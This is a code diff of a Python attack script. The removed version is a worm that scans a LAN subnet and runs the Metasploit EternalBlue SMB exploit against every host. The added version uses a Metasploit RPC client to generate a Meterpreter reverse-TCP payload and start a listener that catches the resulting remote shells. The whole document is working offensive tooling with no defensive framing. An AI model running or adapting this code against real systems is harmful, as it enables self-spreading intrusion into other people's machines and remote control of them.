@@ -1,25 +1,23 @@
-import os
-import subprocess
+from metasploit.msfrpc import MsfRpcClient
 
-def spread_worm():
-    # Get the IP range of the LAN
-    ip_range = input("Enter the IP range of the LAN (e.g., 192.168.0.0/24): ")
+# Connect to the Metasploit RPC server
+client = MsfRpcClient('your_metasploit_host', 'your_metasploit_port', 'your_metasploit_username', 'your_metasploit_password')
 
-    # Generate a list of IP addresses in the LAN
-    ip_list = []
-    for i in range(1, 255):
-        ip = ip_range[:-4] + str(i)
-        ip_list.append(ip)
+# Create a new payload
+payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
 
-    # Spread the worm to each IP address in the LAN
-    for ip in ip_list:
-        try:
-            # Use Metasploit to exploit the target device
-            exploit_command = f"msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {ip}; exploit'"
-            subprocess.run(exploit_command, shell=True, check=True)
-            print(f"Worm successfully spread to {ip}")
-        except subprocess.CalledProcessError:
-            print(f"Failed to spread worm to {ip}")
+# Set the required options for the payload
+payload['LHOST'] = 'your_local_ip'
+payload['LPORT'] = 4444
 
-if __name__ == "__main__":
-    spread_worm()
+# Generate the payload
+payload.generate()
+
+# Start the Metasploit listener
+listener = client.modules.use('exploit', 'multi/handler')
+listener['PAYLOAD'] = 'windows/meterpreter/reverse_tcp'
+listener['LHOST'] = 'your_local_ip'
+listener['LPORT'] = 4444
+
+# Run the listener
+listener.execute()
